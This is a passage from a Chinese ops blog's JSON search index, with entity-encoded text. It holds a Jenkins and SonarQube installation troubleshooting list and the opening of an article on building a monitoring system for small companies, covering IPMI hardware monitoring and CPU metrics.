&#x7CFB;&#x5217;&#x95EE;&#x9898;&#x95EE;&#x9898;&#xFF1A;&#x901A;&#x8FC7;&#x547D;&#x4EE4;&#x76F4;&#x63A5;&#x5B89;&#x88C5;Jenkins&#xFF0C;&#x8FDE;&#x63A5;&#x88AB;&#x62D2;&#x7EDD;&#x65F6;&#x65B9;&#x6848;&#xFF1A;&#x624B;&#x52A8;&#x4E0B;&#x8F7D;&#x5305;&#xFF0C;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;http://mirrors.jenkins-ci.org/war/ &#x95EE;&#x9898;&#xFF1A;Jenkins&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#x542F;&#x52A8;&#x62A5;&#x9519; &#x65B9;&#x6848;&#xFF1A;&#x901A;&#x8FC7;&#x201D;vi /etc/init.d/jenkins&#x201D;&#xFF0C;&#x628A;JDK&#x7684;java&#x8DEF;&#x5F84;&#x52A0;&#x4E0A;&#x5373;&#x53EF;&#x6CE8;&#x610F;&#xFF1A;Jenkins&#x542F;&#x52A8;&#x540E;&#x81EA;&#x52A8;&#x90E8;&#x7F72;Tomcat&#xFF0C;Tomcat&#x9700;&#x5148;&#x542F;&#x52A8; &#x95EE;&#x9898;&#xFF1A;Sonar&#x65E0;&#x6CD5;&#x542F;&#x52A8;&#xFF0C;Failed to start SonarQube.&#x65B9;&#x6848;&#xFF1A;&#x5207;&#x6362;&#x6210;root&#x7528;&#x6237;&#x542F;&#x52A8;&#x8BD5;&#x8BD5;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x6CA1;&#x6709;&#x6743;&#x9650;&#x3002; &#x95EE;&#x9898;&#xFF1A;Sonar&#x4E2D;&#x6587;&#x4E71;&#x7801;&#x95EE;&#x9898;&#x65B9;&#x6848;&#xFF1A;sonar-run&#x914D;&#x7F6E;&#x6709;&#x95EE;&#x9898;&#xFF0C;&#x91CC;&#x9762;&#x7684;jdbc&#x914D;&#x7F6E;&#x662F;&#xFF1A; &#x95EE;&#x9898;&#xFF1A;Sonar&#x67D0;&#x4E2A;&#x7248;&#x672C;&#x5B89;&#x88C5;&#x6210;&#x529F;&#x540E;&#xFF0C;&#x542F;&#x52A8;&#x5374;&#x603B;&#x53EA;&#x663E;&#x793A;&#x4E00;&#x4E2A;&#x9875;&#x9762;&#xFF0C;&#x5E76;&#x63D0;&#x793A;Sonar&#x6B63;&#x5728;&#x7EF4;&#x62A4;&#x4E2D;&#x65B9;&#x6848;&#xFF1A;&#x65E0;&#x9700;&#x66F4;&#x6362;&#x7248;&#x672C;&#xFF0C;&#x4ED4;&#x7EC6;&#x67E5;&#x770B;&#x53D1;&#x73B0;&#x8BE5;&#x63D0;&#x793A;&#x9875;&#x9762;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x70B9;&#x51FB;&#x8FDB;&#x884C;&#x76F8;&#x5173;&#x63D2;&#x4EF6;&#x7684;&#x81EA;&#x52A8;&#x5347;&#x7EA7;&#xFF0C;&#x91CD;&#x542F;&#x540E;&#x9996;&#x9875;&#x5373;&#x53EF;&#x8BBF;&#x95EE;&#x3002; &#x95EE;&#x9898;&#xFF1A;Sonar&#x6210;&#x529F;&#x542F;&#x52A8;&#x540E;&#xFF0C;&#x5374;&#x603B;&#x662F;&#x9A6C;&#x4E0A;&#x81EA;&#x52A8;&#x5173;&#x95ED;&#x670D;&#x52A1;&#x65B9;&#x6848;&#xFF1A;&#x5F88;&#x53EF;&#x80FD;&#x662F;&#x6CA1;&#x6709;&#x542F;&#x52A8;mysql&#x670D;&#x52A1;&#xFF0C;&#x542F;&#x52A8;&#x5373;&#x53EF;&#x3002; &#x95EE;&#x9898;&#xFF1A;Sonar&#x6210;&#x529F;&#x8FD0;&#x884C;&#x540E;&#xFF0C;&#x5982;&#x4F55;&#x663E;&#x793A;&#x4E2D;&#x6587;?&#x65B9;&#x6848;&#xFF1A;&#x5728;Settings/SYSTEM/Update Center/Available Plugins&#x4E0B;&#x5B89;&#x88C5;&#x6C49;&#x5316;&#x5305;&#xFF0C;&#x5E76;&#x91CD;&#x65B0;&#x542F;&#x52A8;Sonar&#x3002;&#x6CE8;&#x610F;&#xFF1A;&#x5F53;&#x67D0;&#x4E9B;&#x63D2;&#x4EF6;&#x603B;&#x662F;&#x4E0B;&#x8F7D;&#x5931;&#x8D25;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x641C;&#x7D22;&#x63D2;&#x4EF6;&#x540D;&#x624B;&#x52A8;&#x4E0B;&#x8F7D;&#xFF0C;&#x5E76;&#x5728;&#x3010;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x2013;&#x7BA1;&#x7406;&#x63D2;&#x4EF6;&#x2013;&#x9AD8;&#x7EA7;&#x2013;&#x6D4F;&#x89C8;-&#x4E0A;&#x4F20;&#x63D2;&#x4EF6;&#x3011;&#x4E2D;&#x4E0A;&#x4F20;&#x63D2;&#x4EF6;&#x5373;&#x53EF;&#x3002; &#x95EE;&#x9898;&#xFF1A;Jenkins&#x96C6;&#x6210;Sonar&#x540E;&#xFF0C;Sonar&#x65E0;&#x6CD5;&#x626B;&#x63CF;Java&#x8BED;&#x8A00;&#x4EE3;&#x7801;&#x65B9;&#x6848;&#xFF1A;&#x5728;Sonar&#x7684;Settings/SYSTEM/Update Center/Available&#x76EE;&#x5F55;&#x4E0B;&#x4E0B;&#x8F7D;Java&#x8BED;&#x8A00;&#x5305;&#xFF0C;&#x5E76;&#x91CD;&#x65B0;&#x542F;&#x52A8;Jenkins&#x548C;Sonar&#x3002;Jenkins&#x4F1A;&#x6839;&#x636E;&#x914D;&#x7F6E;&#x7684;&#x626B;&#x63CF;&#x8DEF;&#x5F84;&#xFF0C;&#x5B9A;&#x65F6;&#x626B;&#x63CF;&#x76F8;&#x5173;&#x4EE3;&#x7801;&#xFF0C;&#x5E76;&#x5728;Sonar&#x4E2D;&#x53EF;&#x89C6;&#x5316;&#x3002;&#x6CE8;&#x610F;&#xFF1A;SonarQube&#x96C6;&#x6210;Java&#x63D2;&#x4EF6;&#x5B98;&#x65B9;&#x5730;&#x5740;&#xFF1A;http://docs.sonarqube.org/display/PLUG/Java+Plugin &#x95EE;&#x9898;&#xFF1A;&#x4E0B;&#x8F7D;&#x67D0;&#x8BED;&#x8A00;&#x5305;&#x540E;&#xFF0C;Sonar&#x91CD;&#x542F;&#x4ECD;&#x7136;&#x65E0;&#x6CD5;&#x626B;&#x63CF;&#x76F8;&#x5173;&#x4EE3;&#x7801;&#x539F;&#x56E0;&#xFF1A;&#x5982;&#x4E0B;&#x8F7D;&#x201D;C/C++/Objective-c&#x201D;&#x8FD9;&#x4E2A;&#x63D2;&#x4EF6;&#x540E;&#xFF0C;&#x91CD;&#x65B0;&#x542F;&#x52A8;&#x626B;&#x63CF;C&#x4EE3;&#x7801;&#x603B;&#x662F;&#x62A5;&#x9519;&#xFF1A;1Caused by: org.sonar.api.utils.SonarException: No license for cpp &#x539F;&#x4EE5;&#x4E3A;&#x662F;&#x9700;&#x8981;&#x5B89;&#x88C5;cpp&#x63D2;&#x4EF6;&#xFF0C;&#x540E;&#x6765;&#x624D;&#x53D1;&#x73B0;&#x91CD;&#x70B9;&#x662F;No license&#xFF0C;&#x610F;&#x601D;&#x5C31;&#x662F;&#x9700;&#x8981;&#x4ED8;&#x8D39;&#x8D2D;&#x4E70;&#x8BB8;&#x53EF;&#x8BC1;&#x3002;&#x7F51;&#x4E0A;&#x641C;&#x7D22;&#x514D;&#x8D39;&#x8BB8;&#x53EF;&#x8BC1;&#x65E0;&#x679C;&#xFF0C;&#x7136;&#x540E;&#x70B9;&#x51FB;&#x201D;Get trial key&#x201D;, &#x7ED3;&#x679C;&#x7ACB;&#x9A6C;&#x6536;&#x5230;&#x5B98;&#x65B9;&#x90AE;&#x4EF6;&#x56DE;&#x590D;&#x88AB;&#x62D2;&#xFF0C;&#x7EC8;&#x653E;&#x5F03;&#x3002; &#x95EE;&#x9898;&#xFF1A;Jenkins&#x96C6;&#x6210;Sonar&#x540E;&#xFF0C;Jenkins&#x81EA;&#x52A8;&#x5316;&#x811A;&#x672C;&#x6267;&#x884C;&#x5931;&#x8D25;&#xFF0C;&#x5E76;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;&#x65B9;&#x6848;&#xFF1A;&#x66F4;&#x6362;&#x63D2;&#x4EF6;&#x7248;&#x672C;&#x5373;&#x53EF;&#xFF0C;&#x4E0B;&#x6B21;&#x5B89;&#x88C5;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x3002; &#x95EE;&#x9898;&#xFF1A;Jenkins&#x8D26;&#x6237;&#x6743;&#x9650;&#x5982;&#x4F55;&#x5206;&#x914D;&#x65B9;&#x6848;&#xFF1A; &#x76F8;&#x5173;&#x94FE;&#x63A5;&#xFF1A;http://www.360doc.com/content/13/0802/14/7811581_304255550.shtml&#x6CE8;&#x610F;&#xFF1A; &#x5982;&#x679C;&#x7528;admin&#x8D26;&#x6237;&#x767B;&#x5F55;&#xFF0C;&#x5728;&#x5206;&#x914D;&#x6743;&#x9650;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C06;admin&#x6743;&#x9650;&#x5168;&#x90E8;&#x7F6E;&#x7A7A;&#xFF0C;&#x4E00;&#x65E6;&#x9000;&#x51FA;&#xFF0C;&#x5C06;&#x65E0;&#x6CD5;&#x4F7F;&#x7528; 0.0&#xFF01;&#x6211;&#x5F53;&#x521D;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x662F;&#x4FEE;&#x6539;&#x8FDC;&#x7A0B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x5982;&#x679C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E00;&#x65E6;&#x6539;&#x4E71;&#xFF0C;&#x5C31;&#x53EA;&#x80FD;&#x91CD;&#x88C5;&#x4E86;&#x3002; &#x8FD0;&#x884C;&#x7ED3;&#x679C;Sonar&#x6210;&#x529F;&#x8FD0;&#x884C;&#x5982;&#x56FE;&#x4E94;&#x56FE;&#x516D;&#x6240;&#x793A;&#xFF0C;&#x5176;&#x4E2D;&#x4EE3;&#x7801;&#x68C0;&#x6D4B;&#x89C4;&#x5219;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x4E5F;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#xFF0C;&#x5BF9;&#x4E8E;&#x56FE;&#x516D;&#x663E;&#x793A;&#x51FA;&#x7684;&#x5177;&#x4F53;&#x9519;&#x8BEF;&#xFF0C;Sonar&#x4E5F;&#x53EF;&#x5728;&#x9875;&#x9762;&#x76F4;&#x63A5;&#x5206;&#x914D;&#x7ED9;&#x67D0;&#x4E2A;&#x7EC4;&#x5458;&#x4FEE;&#x6539;","raw":null,"content":null,"categories":[{"name":"运维部署","slug":"运维部署","permalink":"http://www.wangxin123.com/categories/运维部署/"}],"tags":[{"name":"sonar","slug":"sonar","permalink":"http://www.wangxin123.com/tags/sonar/"},{"name":"jenkins","slug":"jenkins","permalink":"http://www.wangxin123.com/tags/jenkins/"}]},{"title":"中小企业监控体系构建实战","slug":"中小企业监控体系构建实战","date":"2016-06-08T05:15:12.000Z","updated":"2016-11-18T07:36:21.180Z","comments":true,"path":"2016/06/08/中小企业监控体系构建实战/","link":"","permalink":"http://www.wangxin123.com/2016/06/08/中小企业监控体系构建实战/","excerpt":"&#x6587;&#x7AE0;&#x6574;&#x7406;&#x5982;&#x4E0B;&#xFF1A;","keywords":null,"text":"&#x6587;&#x7AE0;&#x6574;&#x7406;&#x5982;&#x4E0B;&#xFF1A; &#x4F5C;&#x8005;&#x4ECB;&#x7ECD;&#x8D75;&#x821C;&#x4E1C;&#xFF0C;&#x6C5F;&#x6E56;&#x4EBA;&#x79F0;&#x8D75;&#x73ED;&#x957F;&#xFF0C;&#x66FE;&#x5728;&#x6B66;&#x8B66;&#x67D0;&#x90E8;&#x8D1F;&#x8D23;&#x6307;&#x6325;&#x81EA;&#x52A8;&#x5316;&#x7684;&#x67B6;&#x6784;&#x548C;&#x8FD0;&#x7EF4;&#x5DE5;&#x4F5C;&#xFF0C;2008&#x5E74;&#x9000;&#x5F79;&#x540E;&#x4E00;&#x76F4;&#x4ECE;&#x4E8B;&#x4E92;&#x8054;&#x7F51;&#x8FD0;&#x7EF4;&#x5DE5;&#x4F5C;&#x3002;&#x66FE;&#x5E26;&#x56E2;&#x961F;&#x8D1F;&#x8D23;&#x56FD;&#x5185;&#x67D0;&#x98DF;&#x54C1;&#x7535;&#x5546;&#x7684;&#x8FD0;&#x7EF4;&#x5DE5;&#x4F5C;&#xFF0C;&#x5373;&#x5C06;&#x51FA;&#x7248;&#x7684;&#x300A;saltstack&#x5165;&#x95E8;&#x4E0E;&#x5B9E;&#x8DF5;&#x300B;&#x4F5C;&#x8005;&#x4E4B;&#x4E00;&#x3002; &#x4E3B;&#x9898;&#x7B80;&#x4ECB;&#x6211;&#x4EEC;&#x4ECA;&#x5929;&#x7684;&#x8BDD;&#x9898;&#x662F;&#x300A;&#x4E2D;&#x5C0F;&#x4F01;&#x4E1A;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x6784;&#x5EFA;&#x5B9E;&#x6218;&#x300B;&#xFF0C;&#x524D;&#x671F;&#x5206;&#x4EAB;&#x4E86;&#x300A;&#x4E2D;&#x5C0F;&#x4F01;&#x4E1A;&#x81EA;&#x52A8;&#x5316;&#x90E8;&#x7F72;&#x5B9E;&#x6218;&#x300B;&#x8FD8;&#x6CA1;&#x6709;&#x770B;&#x5230;&#x7684;&#x670B;&#x53CB;&#x53EF;&#x4EE5;&#x5148;&#x9605;&#x8BFB;&#x4E0B;&#xFF0C;&#x8FD9;&#x6837;&#x4E5F;&#x80FD;&#x660E;&#x767D;&#x4E3A;&#x4F55;&#x8981;&#x5B9A;&#x4F4D;&#x4E2D;&#x5C0F;&#x4F01;&#x4E1A;&#x3002;&#x76D1;&#x63A7;&#x8FD9;&#x4E2A;&#x8BDD;&#x9898;&#x5B9E;&#x5728;&#x592A;&#x5927;&#xFF0C;&#x6240;&#x4EE5;&#x672C;&#x6587;&#x7684;&#x6B63;&#x786E;&#x5B9A;&#x4F4D;&#x5E94;&#x8BE5;&#x662F;&#x5982;&#x4F55;&#x6784;&#x5EFA;&#x4E00;&#x4E2A;&#x201C;&#x76F8;&#x5BF9;&#x201D;&#x5B8C;&#x5584;&#x7684;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x3002; &#x4ECE;&#x9762;&#x8BD5;&#x5F00;&#x59CB;&#x5728;&#x4E4B;&#x524D;&#x7684;&#x62DB;&#x8058;&#x9762;&#x8BD5;&#x4E2D;&#xFF0C;&#x6211;&#x5FC5;&#x95EE;&#x7684;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x201C;&#x4F60;&#x4EEC;&#x4E4B;&#x524D;&#x516C;&#x53F8;&#x7684;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x662F;&#x600E;&#x4E48;&#x505A;&#x7684;&#xFF1F;&#x4F60;&#x8BA4;&#x4E3A;&#x600E;&#x4E48;&#x505A;&#x6548;&#x679C;&#x6BD4;&#x8F83;&#x597D;&#xFF1F;&#x201D; &#x7ECF;&#x5E38;&#x5F97;&#x5230;&#x8FD9;&#x6837;&#x7C7B;&#x4F3C;&#x7684;&#x7B54;&#x6848;&#xFF1A;&#x201C;&#x6211;&#x4EEC;&#x516C;&#x53F8;&#x7528;&#x7684;Nagios&#x3001;Cacti&#x505A;&#x76D1;&#x63A7;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#x6211;&#x4EEC;&#x516C;&#x53F8;&#x7528;Zabbix&#x505A;&#x76D1;&#x63A7;&#x201D;&#xFF0C;&#x518D;&#x7EE7;&#x7EED;&#x8FFD;&#x95EE;&#x5F80;&#x5F80;&#x5F97;&#x5230;&#x7684;&#x4E5F;&#x662F;&#x5982;&#x4F55;&#x4F7F;&#x7528;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x7684;&#x7EC6;&#x8282;&#x7684;&#x56DE;&#x7B54;&#x3002; &#x8FD9;&#x6837;&#x7684;&#x56DE;&#x7B54;&#x56FA;&#x7136;&#x6CA1;&#x9519;&#xFF0C;&#x4F46;&#x5374;&#x53CD;&#x6620;&#x51FA;&#x6765;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x7ECF;&#x5E38;&#x4F1A;&#x88AB;&#x5DE5;&#x5177;&#x8FF7;&#x60D1;&#x53CC;&#x773C;&#xFF0C;&#x4ECE;&#x800C;&#x5FD8;&#x8BB0;&#x4E86;&#x6700;&#x521D;&#x7684;&#x51FA;&#x53D1;&#x70B9;&#x3002;&#x672C;&#x6587;&#x5C31;&#x4EE5;&#x4E00;&#x4E2A;&#x521A;&#x5165;&#x804C;&#x7684;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x5C0F;&#x738B;&#x7684;&#x6545;&#x4E8B;&#x6765;&#x9610;&#x8FF0;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x4E2A;&#x6545;&#x4E8B;&#x7684;&#x540D;&#x5B57;&#x53EB;&#x505A;&#x300A;&#x5C0F;&#x738B;&#x7279;&#x70E6;&#x607C;&#x300B;&#x3002; 1. &#x786E;&#x5B9A;&#x76EE;&#x6807;&#x3001;&#x7EDF;&#x4E00;&#x601D;&#x60F3;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x8DF3;&#x8FC7;&#x4EC0;&#x4E48;&#x662F;&#x76D1;&#x63A7;&#x548C;&#x76D1;&#x63A7;&#x7684;&#x91CD;&#x8981;&#x6027;&#x7B49;&#x5927;&#x6BB5;&#x63CF;&#x8FF0;&#xFF0C;&#x5148;&#x4ED4;&#x7EC6;&#x7684;&#x60F3;&#x4E00;&#x60F3;&#xFF0C;&#x76D1;&#x63A7;&#x7684;&#x76EE;&#x6807;&#x662F;&#x4EC0;&#x4E48;&#xFF1F; &#x6BCF;&#x4E2A;&#x4EBA;&#x7684;&#x7B54;&#x6848;&#x90FD;&#x4E0D;&#x540C;&#xFF0C;&#x6211;&#x7684;&#x56DE;&#x7B54;&#x662F;&#xFF1A;&#x7EC8;&#x6781;&#x76EE;&#x6807;&#x5C31;&#x662F;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x4E1A;&#x52A1;&#x7684;&#x6301;&#x7EED;&#x548C;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#x3002;&#x5982;&#x6B64;&#x504F;&#x6FC0;&#x7684;&#x56DE;&#x7B54;&#x5C31;&#x662F;&#x8BA9;&#x8BFB;&#x8005;&#x4ECE;&#x73B0;&#x5728;&#x5F00;&#x59CB;&#x8981;&#x7AD9;&#x5728;&#x4E1A;&#x52A1;&#x7684;&#x89D2;&#x5EA6;&#x7684;&#x5F00;&#x59CB;&#x89C4;&#x5212;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x67D0;&#x4E2A;&#x6280;&#x672F;&#x8303;&#x7574;&#x3002; &#x6CE8;&#x610F;&#xFF1A;&#x672C;&#x6587;&#x4E0D;&#x6D89;&#x53CA;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x3001;&#x6027;&#x80FD;&#x4F18;&#x5316;&#x4E2D;&#x7684;&#x76D1;&#x63A7;&#xFF0C;&#x6240;&#x6709;&#x6587;&#x5B57;&#x7684;&#x51FA;&#x53D1;&#x70B9;&#x90FD;&#x662F;&#x65E5;&#x5E38;&#x8FD0;&#x7EF4;&#x76D1;&#x63A7;&#x3002; &#x5728;&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#xFF0C;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x5148;&#x7EDF;&#x4E00;&#x4E0B;&#x8BA4;&#x8BC6;&#xFF1A;&#x8981;&#x76D1;&#x63A7;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x9700;&#x8981;&#x638C;&#x63E1;&#x54EA;&#x4E9B;&#x4E1C;&#x897F;&#x5462;&#xFF1F; &#x76D1;&#x63A7;&#x5BF9;&#x8C61;&#x7684;&#x7406;&#x89E3;&#xFF1A;&#x8981;&#x76D1;&#x63A7;&#x7684;&#x5BF9;&#x8C61;&#x4F60;&#x662F;&#x5426;&#x4E86;&#x89E3;&#x5462;&#xFF1F;&#x6BD4;&#x5982;CPU&#x5230;&#x5E95;&#x662F;&#x5982;&#x4F55;&#x5DE5;&#x4F5C;&#x7684;&#xFF1F; &#x76D1;&#x63A7;&#x5BF9;&#x8C61;&#x7684;&#x6307;&#x6807;&#xFF1A;&#x6211;&#x4EEC;&#x8981;&#x76D1;&#x63A7;&#x8FD9;&#x4E2A;&#x4E1C;&#x897F;&#x7684;&#x4EC0;&#x4E48;&#x5C5E;&#x6027;&#xFF1F;&#x6BD4;&#x5982;CPU&#x7684;CPU&#x4F7F;&#x7528;&#x7387;&#x3001;&#x8D1F;&#x8F7D;&#x3001;&#x4E0A;&#x4E0B;&#x6587;&#x5207;&#x6362;&#x3002; &#x786E;&#x5B9A;&#x62A5;&#x8B66;&#x57FA;&#x51C6;&#x7EBF;&#xFF1A;&#x600E;&#x4E48;&#x6837;&#x624D;&#x7B97;&#x662F;&#x6545;&#x969C;&#xFF0C;&#x8981;&#x62A5;&#x8B66;&#x5462;&#xFF1F;&#x6BD4;&#x5982;CPU&#x7684;&#x8D1F;&#x8F7D;&#x5230;&#x5E95;&#x591A;&#x5C11;&#x7B97;&#x9AD8;&#xFF1F; &#x5982;&#x679C;&#x4E0A;&#x8FF0;&#x7684;&#x6761;&#x4EF6;&#x4E0D;&#x6EE1;&#x8DB3;&#xFF0C;&#x90A3;&#x5C31;&#x5148;&#x4E0D;&#x8981;&#x5F00;&#x59CB;&#x5B9E;&#x65BD;&#x76D1;&#x63A7;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x7B49;&#x505A;&#x5B8C;&#x4E86;&#xFF0C;&#x4F60;&#x4F1A;&#x53D1;&#x73B0;&#xFF0C;&#x7136;&#x5E76;&#x5375;&#xFF1F; 2. &#x6545;&#x4E8B;&#x5F00;&#x59CB;&#x738B;&#x5C0F;&#x660E;&#xFF08;&#x5316;&#x540D;&#xFF09;&#x521A;&#x521A;&#x6BD5;&#x4E1A;&#xFF0C;&#x5230;&#x4E86;&#x4E00;&#x5BB6;&#x521A;&#x521A;&#x8D77;&#x6B65;&#x7684;&#x7535;&#x5546;&#x516C;&#x53F8;&#x4EFB;&#x804C;&#xFF1A;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#xFF0C;&#x521A;&#x4E0A;&#x73ED;&#x7B2C;&#x4E00;&#x5929;&#xFF0C;&#x5C0F;&#x738B;&#x6536;&#x5230;&#x9886;&#x5BFC;&#x5B89;&#x6392;&#x7684;&#x5149;&#x8363;&#x4EFB;&#x52A1;:&#x628A;&#x6211;&#x4EEC;&#x516C;&#x53F8;&#x7684;&#x76D1;&#x63A7;&#x641E;&#x8D77;&#x6765;&#xFF01; &#x5C0F;&#x738B;&#x60F3;&#x4E86;&#x597D;&#x4E45;&#xFF0C;&#x6CA1;&#x60F3;&#x660E;&#x767D;&#xFF0C;&#x7D22;&#x6027;&#x4E0D;&#x60F3;&#x4E86;&#xFF0C;&#x4ECE;&#x624B;&#x5934;&#x63A5;&#x89E6;&#x5230;&#x7684;&#x6162;&#x6162;&#x5F00;&#x59CB;&#x5427;,&#x4E8E;&#x662F;&#x5C0F;&#x738B;&#x51B3;&#x5B9A;&#x5148;&#x53BB;&#x673A;&#x623F;&#x770B;&#x770B;&#x3002; 2.1 &#x786C;&#x4EF6;&#x76D1;&#x63A7;&#x5230;&#x4E86;&#x673A;&#x623F;&#xFF0C;&#x5C0F;&#x738B;&#x770B;&#x7740;&#x516C;&#x53F8;&#x7684;&#x5404;&#x79CD;&#x54C1;&#x724C;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x60F3;&#x5230;&#x7684;&#x7B2C;&#x4E00;&#x4EF6;&#x4E8B;&#x60C5;&#x5C31;&#x662F;&#xFF0C;&#x8FD9;&#x4E9B;&#x786C;&#x4EF6;&#x8BBE;&#x5907;&#xFF0C;&#x6211;&#x8981;&#x76D1;&#x63A7;&#x8D77;&#x6765;&#x3002; &#x786C;&#x4EF6;&#x8BBE;&#x5907;&#x76D1;&#x63A7;&#x662F;&#x6700;&#x57FA;&#x7840;&#x7684;&#x76D1;&#x63A7;&#x624B;&#x6BB5;&#xFF0C;&#x6BD4;&#x5982;&#x5B9A;&#x671F;&#x7684;&#x7684;&#x673A;&#x623F;&#x5DE1;&#x68C0;&#x3002; &#x901A;&#x5E38;&#x6211;&#x4EEC;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x90FD;&#x4F1A;&#x6709;&#x8FDC;&#x7A0B;&#x63A7;&#x5236;&#x5361;&#xFF0C;&#x5982;Dell&#x7684;iDRAC,HP&#x7684;ILO&#x548C;IBM&#x7684;IMM&#x7B49;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;Web&#x754C;&#x9762;&#x6765;&#x8FDB;&#x884C;&#x786C;&#x4EF6;&#x7684;&#x76D1;&#x63A7;&#x548C;&#x7BA1;&#x7406;&#x5DE5;&#x4F5C;&#xFF0C;&#x5982;&#x679C;&#x8D2D;&#x4E70;&#x4F01;&#x4E1A;&#x7EA7;&#x7684;&#x6388;&#x6743;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x63A7;&#x5236;&#x53F0;&#x8FDB;&#x884C;&#x7BA1;&#x7406;&#x3002; &#x5728;Linux&#x4E0B;&#xFF0C;&#x901A;&#x5E38;&#x6211;&#x4EEC;&#x4F7F;&#x7528;IPMI&#x6765;&#x5B8C;&#x6210;&#x7269;&#x7406;&#x8BBE;&#x5907;&#x7684;&#x76D1;&#x63A7;&#x5DE5;&#x4F5C;&#x3002;&#x901A;&#x5E38;&#x5FC5;&#x987B;&#x8981;&#x76D1;&#x63A7;&#x7684;&#x5C31;&#x662F;&#x6E29;&#x5EA6;&#x3001;&#x786C;&#x76D8;&#x6545;&#x969C;&#x7B49;&#x3002; &#x5C0F;&#x738B;&#x7F16;&#x5199;&#x4E86;&#x81EA;&#x5DF1;&#x804C;&#x4E1A;&#x751F;&#x6DAF;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#xFF0C;&#x5C31;&#x662F;&#x4F7F;&#x7528;ipmi&#x5DE5;&#x5177;&#x83B7;&#x53D6;&#x6E29;&#x5EA6;&#x4F20;&#x611F;&#x5668;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5927;&#x4E8E;50&#x5C31;&#x53D1;&#x4E00;&#x4EFD;&#x90AE;&#x4EF6;&#x7ED9;&#x4ED6;&#xFF0C;&#x867D;&#x7136;&#x611F;&#x89C9;&#x4E0D;&#x9AD8;&#x7AEF;&#xFF0C;&#x4F46;&#x603B;&#x7B97;&#x662F;&#x6709;&#x4E00;&#x4E2A;&#x5F00;&#x59CB;&#x3002; &#x6545;&#x969C;&#x56DE;&#x60F3;&#xFF1A;&#x4E4B;&#x524D;&#x6211;&#x53F8;&#x6258;&#x7BA1;&#x5728;&#x5317;&#x4EAC;&#x67D0;&#x673A;&#x623F;&#x7684;&#x8BBE;&#x5907;&#x5C31;&#x51FA;&#x73B0;&#x8FC7;&#xFF0C;&#x56E0;&#x4E3A;&#x521A;&#x597D;&#x6240;&#x5728;&#x673A;&#x67DC;&#x533A;&#x57DF;&#x7684;&#x7A7A;&#x8C03;&#x574F;&#x4E86;&#xFF0C;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x5668;&#x6E29;&#x5EA6;&#x8FC7;&#x9AD8;&#xFF0C;&#x7136;&#x540E;&#x7CFB;&#x7EDF;&#x5B95;&#x673A;&#x3002; 2.2 &#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#x5C0F;&#x738B;&#x4E0B;&#x4E00;&#x4E2A;&#x60F3;&#x5230;&#x7684;&#x5C31;&#x662F;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#xFF0C;&#x516C;&#x53F8;&#x5168;&#x662F;Linux&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x7684;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#xFF0C;&#x80AF;&#x5B9A;&#x662F;&#x8981;&#x76D1;&#x63A7;&#x8D77;&#x6765;&#x7684;&#x3002; &#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#x662F;&#x76D1;&#x63A7;&#x4F53;&#x7CFB;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x7CFB;&#x7EDF;&#x76D1;&#x63A7;&#x4E3B;&#x8981;&#x7684;&#x5BF9;&#x8C61;&#x6709;&#xFF1A; 1&#x3001;CPU2&#x3001;Memory3&#x3001;IO4&#x3001;CPU&#xFF1A;&#x5173;&#x4E8E;CPU&#xFF0C;&#x6709;3&#x4E2A;&#x91CD;&#x8981;&#x7684;&#x6982;&#x5FF5;&#xFF1A;&#x4E0A;&#x4E0B;&#x6587;&#x5207;&#x6362;&#xFF08;context switchs&#xFF09;&#xFF0C;&#x8FD0;&#x884C;&#x961F;&#x5217;&#xFF08;Run queue&#xFF09;&#x548C;&#x4F7F;&#x7528;&#x7387;&#xFF08;utilization&#xFF09;&#x3002; 